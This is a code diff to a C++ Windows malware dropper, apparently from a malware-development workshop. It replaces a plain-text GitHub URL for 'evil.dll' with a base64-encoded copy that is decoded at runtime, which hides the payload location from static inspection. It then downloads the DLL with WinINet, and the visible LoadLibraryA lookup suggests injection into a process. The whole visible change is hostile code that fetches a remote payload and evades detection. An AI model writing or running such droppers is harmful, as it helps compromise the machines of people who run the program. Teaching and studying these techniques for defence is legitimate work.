@@ -10,7 +10,9 @@ author: @cocomelonc
 #include <tlhelp32.h>
 #include <wininet.h>
 #include <wincrypt.h>
-#pragma comment (lib, "wininet.lib")
+
+// #pragma comment (lib, "wininet.lib")
+// #pragma comment (lib, "crypt32.lib")
 
 void base64Decode(char* b64Message, char** message, DWORD* messageLen) {
   if (!CryptStringToBinaryA(b64Message, 0, CRYPT_STRING_BASE64, NULL, messageLen, NULL, NULL)) {
@@ -71,8 +73,14 @@ int main(int argc, char* argv[]) {
   HMODULE hKernel32 = GetModuleHandle("Kernel32");
   VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
 
+  char* b64Url = "aHR0cHM6Ly9naXRodWIuY29tL2NvY29tZWxvbmMvYnNwcmlzaHRpbmEtMjAyNC1tYWxkZXYtd29ya3Nob3AvcmF3L3JlZnMvaGVhZHMvbWFpbi8wMy1pbmplY3Rpb24vMDMtZHJvcHBlci9ldmlsLmRsbA==";
+  char* evilUrl;
+  DWORD messageLen;
+
+  base64Decode(b64Url, &evilUrl, &messageLen);
+
   HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)"https://github.com/cocomelonc/bsprishtina-2024-maldev-workshop/raw/refs/heads/main/03-injection/03-dropper/evil.dll", 0, 0, 0, 0);
+  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)evilUrl, 0, 0, 0, 0);
   DWORD dwFileSize = 1024;
   char* buffer = new char[dwFileSize + 1];
   DWORD dwBytesRead;
